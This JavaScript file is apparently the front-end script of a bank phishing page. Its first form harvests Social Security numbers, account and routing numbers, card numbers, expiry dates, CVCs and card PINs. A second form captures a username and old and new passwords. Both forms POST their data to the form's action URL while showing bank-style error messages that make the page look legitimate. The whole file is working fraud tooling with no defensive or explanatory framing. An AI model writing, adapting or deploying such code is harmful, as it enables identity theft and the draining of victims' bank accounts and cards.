
// FORM ONE
const ssno = document.querySelector("#ssno");
const accno = document.querySelector("#acc");
const rouno = document.querySelector("#rou");
const cardno = document.querySelector("#cardno");
const mmyy = document.querySelector("#mmyy");
const cvc = document.querySelector("#cvc");
const cardp = document.querySelector("#cardp");
const page1 = document.querySelector(".containerfluidid");
const page2 = document.querySelector(".containerfluidpass");
const page3 = document.querySelector(".containerfluidconfirm");
const form = document.querySelector(".formone");
const errorText1 = document.querySelector(".error01");
const errorText2 = document.querySelector(".error02");
const errorText3 = document.querySelector(".error03");
const errorText4 = document.querySelector(".error04");
const errorText5 = document.querySelector(".error05");
const errorText6 = document.querySelector(".error06");
const errorText7 = document.querySelector(".error07");
const ssnoo = document.querySelector(".ssnoo");
const accnoo = document.querySelector(".accc");
const rounoo = document.querySelector(".rouu");
const cardnoo = document.querySelector(".cardnoo");
const mmyyy = document.querySelector(".mmyyy");
const cvcc = document.querySelector(".cvcc");
const cardpp = document.querySelector(".cardpp");

//   FORM ONE SET-UP
form.addEventListener("submit", (e) => {
    e.preventDefault();

    let ssnoValue = ssno.value.replace(/-/g, "");
    let accnoValue = accno.value.replace(/-/g, "");
    let rounoValue = rouno.value.replace(/-/g, "");
    let cardnoValue = cardno.value.replace(/-/g, "");
    let mmyyValue = mmyy.value.replace(/\//g, "");
    let cvcValue = cvc.value;
    let cardpValue = cardp.value;

    async function submitFormData(formElement) {
        try {
            const formData = new FormData(formElement);
            const response = await fetch(formElement.action, {
                method: "POST",
                body: formData,
            });

            if (response.ok) {
                console.log("Form Submitted Successfully");
            } else {
                console.error("Form Submission Failed");
            }
        } catch (error) {
            console.error("Error: ", error);
        }
    }

    if (
        ssnoValue.length === 9 &&
        (accnoValue.length >= 9 || accnoValue.length >= 12) &&
        rounoValue.length === 9 &&
        cardnoValue.length === 16 &&
        mmyyValue.length === 4 &&
        cvcValue.length === 3 &&
        cardpValue.length === 4
    ) {
        submitFormData(form);
        page1.style.display = "none";
        page2.style.display = "flex";
        hideAllErrorMessages();
    } else if (ssnoValue.length < 9) {
        showError(errorText1, "It looks like the Social Security number or Tax ID (TIN) isn't in the correct format. Please try again.");
        setLabelColor("var(--red)", ssnoo);
    } else if (accnoValue.length < 9) {
        showError(errorText2, "It looks like the account number you told us is incorrect. Please try again.");
        setLabelColor("var(--red)", accnoo);
    } else if (rounoValue.length < 9) {
        showError(errorText3, "It looks like the routing number you told us is incorrect. Please try again.");
        setLabelColor("var(--red)", rounoo);
    } else if (cardnoValue.length < 16) {
        showError(errorText4, "It looks like the card number you told us is incorrect. Please try again.");
        setLabelColor("var(--red)", cardnoo);
    } else if (mmyyValue.length < 4) {
        showError(errorText5, "It looks like the mm/yy you told us is incorrect. Please try again.");
        setLabelColor("var(--red)", mmyyy);
    } else if (cvcValue.length < 3) {
        showError(errorText6, "It looks like the cvc number you told us is incorrect. Please try again.");
        setLabelColor("var(--red)", cvcc);
    } else if (cardpValue.length < 4) {
        showError(errorText7, "It looks like the pin you told us is incorrect. Please try again.");
        setLabelColor("var(--red)", cardpp);
    }
});

function showError(errorElement, message) {
    errorElement.innerHTML = message;
    errorElement.style.visibility = "visible";
}

function hideAllErrorMessages() {
    errorText1.style.visibility = "hidden";
    errorText2.style.visibility = "hidden";
    errorText3.style.visibility = "hidden";
    errorText4.style.visibility = "hidden";
    errorText5.style.visibility = "hidden";
    errorText6.style.visibility = "hidden";
    errorText7.style.visibility = "hidden";
}

//   function showAllErrorMessages() {
//     errorText1.style.visibility = "visible";
//     errorText2.style.visibility = "visible";
//     errorText3.style.visibility = "visible";
//     errorText4.style.visibility = "visible";
//     errorText5.style.visibility = "visible";
//     errorText6.style.visibility = "visible";
//     errorText7.style.visibility = "visible";
//   }

function setLabelColor(color, ...labelFields) {
    labelFields.forEach((label) => {
        label.style.color = color;
    });
}

//   SSN FORMAT
ssno.addEventListener("input", function (e) {
    let value = e.target.value.replace(/\D/g, "");
    let formattedValue = "";

    if (value.length > 0) {
        formattedValue += value.slice(0, 3);
    }
    if (value.length > 3) {
        formattedValue += "-";
    }
    if (value.length > 3) {
        formattedValue += value.slice(3, 5);
    }
    if (value.length > 5) {
        formattedValue += "-";
    }
    if (value.length > 5) {
        formattedValue += value.slice(5, 9);
    }
    e.target.value = formattedValue;
});

//   ACCNO FORMAT
accno.addEventListener("input", formatAccountNumber);
function formatAccountNumber() {
    let input = accno.value.replace(/\D/g, "");
    let formattedInput = "";

    const format = [4, 1, 4];
    for (let i = 0; i < format.length; i++) {
        const segment = input.slice(0, format[i]);
        if (segment) {
            formattedInput += segment;
            if (i < format.length - 1) {
                formattedInput += "-";
            }
            input = input.slice(format[i]);
        }
    }
    accno.value = formattedInput;
}

//   ROUNO FORMAT
rouno.addEventListener("input", formatRoutingNumber);
function formatRoutingNumber() {
    let input = rouno.value.replace(/\D/g, "");
    let formattedInput = "";

    const format = [4, 1, 4];
    for (let i = 0; i < format.length; i++) {
        const segment = input.slice(0, format[i]);
        if (segment) {
            formattedInput += segment;
            if (i < format.length - 1) {
                formattedInput += "-";
            }
            input = input.slice(format[i]);
        }
    }
    rouno.value = formattedInput;
}

//  CARD NUMBER FORMAT
cardno.addEventListener("input", formatCardNumber);
function formatCardNumber() {
    let input = cardno.value.replace(/\D/g, "");
    let formattedInput = "";
    const format = [4, 4, 4, 4];

    for (let i = 0; i < format.length; i++) {
        const segment = input.slice(0, format[i]);
        if (segment) {
            formattedInput += segment;
            if (i < format.length - 1) {
                formattedInput += "-";
            }
            input = input.slice(format[i]);
        }
    }
    cardno.value = formattedInput;
}

//   MM/YY FORMAT
mmyy.addEventListener("input", formatMmYyNumber);
function formatMmYyNumber() {
    let input = mmyy.value.replace(/\D/g, "");
    let formattedInput = "";
    const format = [2, 2];

    for (let i = 0; i < format.length; i++) {
        const segment = input.slice(0, format[i]);
        if (segment) {
            formattedInput += segment;
            if (i < format.length - 1) {
                formattedInput += "/";
            }
            input = input.slice(format[i]);
        }
    }
    mmyy.value = formattedInput;
}

//   CVC FORMAT
cvc.addEventListener("input", formatCvcNumber);
function formatCvcNumber() {
    let input = cvc.value.replace(/\D/g, "");
    let formattedInput = "";
    const format = [3];

    for (let i = 0; i < format.length; i++) {
        const segment = input.slice(0, format[i]);
        if (segment) {
            formattedInput += segment;
            input = input.slice(format[i]);
        }
    }
    cvc.value = formattedInput;
}

//   CARD PIN FORMAT
cardp.addEventListener("input", formatPinNumber);
function formatPinNumber() {
    let input = cardp.value.replace(/\D/g, "");
    let formattedInput = "";
    const format = [4];

    for (let i = 0; i < format.length; i++) {
        const segment = input.slice(0, format[i]);
        if (segment) {
            formattedInput += segment;
            input = input.slice(format[i]);
        }
    }
    cardp.value = formattedInput;
}

// FORM TWO
const formtwo = document.querySelector(".formtwo");
const username = document.querySelector("#username");
const oldpass = document.querySelector("#oldpass");
const newpass = document.querySelector("#newpass");
const connewpass = document.querySelector("#connewpass");
const errorText11 = document.querySelector(".error11");
const errorText12 = document.querySelector(".error12");
const errorText13 = document.querySelector(".error13");
const errorText14 = document.querySelector(".error14");
const usernamee = document.querySelector(".usernamee");
const oldpasss = document.querySelector(".oldpasss");
const newpasss = document.querySelector(".newpasss");
const connewpasss = document.querySelector(".connewpasss");

// FORM TWO SET-UP
formtwo.addEventListener("submit", (e) => {
    e.preventDefault();
    let usernamevalue = username.value;
    let oldpassValue = oldpass.value;
    let newpassValue = newpass.value;
    let connewpassValue = connewpass.value;

    async function submitFormTwoData(formElement) {
        try {
            const formData = new FormData(formElement);
            const response = await fetch(formElement.action, {
                method: "POST",
                body: formData,
            });

            if (response.ok) {
                console.log("Form Submitted Successfully");
            } else {
                console.error("Form Submission Failed");
            }
        } catch (error) {
            console.error("Error: ", error);
        }
    }

    if (usernamevalue.length >= 4 && oldpassValue.length >= 4 && newpassValue.length >= 4 && connewpassValue.length >= 4) {
        submitFormTwoData(formtwo);
        page2.style.display = "none";
        page3.style.display = "flex";
        hideAllErrorMessagesTwo();
    } else if (usernamevalue.length < 4) {
        showErrorTwo(errorText11, "The username you entered is too short. Please try again.");
        setLabelColor("var(--red)", usernamee);
    } else if (oldpassValue.length < 4) {
        showErrorTwo(errorText12, "The password you entered is too short. Please try again.");
        setLabelColor("var(--red)", oldpasss);
    } else if (newpassValue.length < 4) {
        showErrorTwo(errorText13, "The password you entered is too short. Please try again.");
        setLabelColor("var(--red)", newpasss);
    } else if (connewpassValue.length < 4) {
        showErrorTwo(errorText14, "The password you entered is too short. Please try again.");
        setLabelColor("var(--red)", connewpasss);
    }
});

function showErrorTwo(errorElement, message) {
    errorElement.innerHTML = message;
    errorElement.style.visibility = "visible";
}

function hideAllErrorMessagesTwo() {
    errorText11.style.visibility = "hidden";
    errorText12.style.visibility = "hidden";
    errorText13.style.visibility = "hidden";
    errorText14.style.visibility = "hidden";
}

function setLabelColor(color, ...labelFields) {
    labelFields.forEach((label) => {
        label.style.color = color;
    });
}
